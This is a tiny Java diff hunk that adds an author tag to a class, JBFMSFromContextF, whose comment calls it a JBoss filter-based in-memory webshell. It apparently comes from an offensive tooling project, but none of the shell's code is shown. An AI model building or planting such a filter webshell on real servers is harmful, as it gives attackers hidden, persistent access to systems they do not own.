@@ -18,6 +18,7 @@ import static org.fusesource.jansi.Ansi.ansi;
 
 /**
  * jboss Filter 内存马
+ * @author nu1r
  */
 public class JBFMSFromContextF implements Filter {
 
